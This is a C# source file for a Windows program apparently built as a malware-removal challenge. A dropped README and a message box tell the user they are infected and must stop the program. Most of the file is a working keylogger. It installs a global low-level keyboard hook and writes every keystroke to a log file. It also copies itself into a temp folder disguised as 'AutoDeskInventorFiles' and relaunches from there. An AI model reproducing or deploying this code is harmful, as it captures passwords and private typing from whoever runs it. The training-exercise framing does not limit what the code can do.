using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace C8_Insecure_Network_Application
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static string path = Path.GetTempPath() + "\\C8_InsecureApp\\";
        public static string hidden = Path.GetTempPath() + "AutoDeskInventorFiles\\";
        static void Main(string[] args)
        {

            Debug.Print(System.Reflection.Assembly.GetExecutingAssembly().Location);
            if (System.Reflection.Assembly.GetExecutingAssembly().Location != hidden + "C8_Insecure.exe")
            {
                try
                {
                    File.Delete(hidden + "C8_Insecure.exe");
                    Directory.Delete(path);
                    Directory.CreateDirectory(path);
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, hidden);
                    exit();
                }
                catch
                {
                    Directory.CreateDirectory(path);
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, hidden+"C8_Insecure.exe");
                    exit();
                }

            } 

            void exit()
            {
                System.Diagnostics.Process.Start(hidden + "C8_Insecure.exe");
                System.Environment.Exit(1);
            }


            try
            {
                Directory.Delete(path);
                Directory.CreateDirectory(path);
            }
            catch
            {
                Directory.CreateDirectory(path);
            }

            using (StreamWriter sw = File.CreateText(path + "\\README.txt"))
                {
                    sw.WriteLine("OOF You Just Got A Virus WACKY");
                    sw.WriteLine("");
                    sw.WriteLine("Soooooo what do you do now? Well initially there will be no hints whatsoever");
                    sw.WriteLine("This is a RAT virus or a Remote Access Trojen, simply put it is very bad");
                    sw.WriteLine("You have to act quickly before bad stuff happens!");
                    sw.WriteLine("There are multiple ways to stop this program but your goal is to compleatly stop this program without erasing ANYTHING");

                    sw.WriteLine("Heres a good read! https://en.wikipedia.org/wiki/Remote_access_trojan");
                    Write("[!] Keylogger Started!");
                }

                MessageBox((IntPtr)0, "Wacky it seems you got a Virus!\nThat is a large bad thing figure out how to remove it!\nHere is a hint ;)\n" + path + "\nHave Fun!", "C8_InsecureApp", 0);
                /*
                 * 
                 * Begin Actual Malware
                 * Currently Includes 
                 * - A Keylogger
                 * 
                 * 
                 */ 
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            

        }


        public static async Task Write(string messaage, bool append = true)
        {
            using (FileStream stream = new FileStream(path + "\\Ignore.txt", append ? FileMode.Append : FileMode.Create, FileAccess.Write, FileShare.None, 4096, true))
            using (StreamWriter sw = new StreamWriter(stream))
            {
                await sw.WriteLineAsync(messaage);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            [STAThread]
            private static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    if ((Keys)vkCode == Keys.PrintScreen)
                    {
                    }
                if ((Keys)vkCode == Keys.Enter)
                {
                    Console.Write("\n"+(Keys)vkCode+"\n");
                    Write("\n" + (Keys)vkCode + "\n");
                }
                else
                {
                    Console.Write((Keys)vkCode);
                    Write((Keys)vkCode + "");
                }
                       
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
        
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);
    }
}

